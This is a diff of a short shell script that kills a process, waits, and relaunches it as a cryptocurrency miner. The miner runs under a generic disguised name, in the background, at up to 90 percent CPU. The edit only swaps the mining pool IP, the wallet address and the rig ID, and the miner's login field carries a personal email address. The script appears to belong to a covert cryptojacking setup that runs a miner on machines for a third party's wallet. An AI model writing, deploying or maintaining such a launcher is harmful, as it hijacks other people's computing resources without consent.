@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 188.165.224.211:30007 -u 45wui8xTuZFQk7A6pFv8Dka9zsoTSXpwe1Wyx9pRD18SKzRJiCJ5ovXgkkDUiDvBhKJNkiEbCgBUDPHTJZj6KdbLSaCrgc9 --pass=x:solscobbturpa@gmail.com --rig-id=23 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 116.202.248.230:40017 -u 42yUs43a28BQPN2BaYZtuT1N4V7vATA1Sj4STnpTS4jyL4PgWTCNrukhbNDGnZguCr6o7LHDQkUjGDeu3FTGkqnjHCTZeAT --pass=x:solscobbturpa@gmail.com --rig-id=7 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
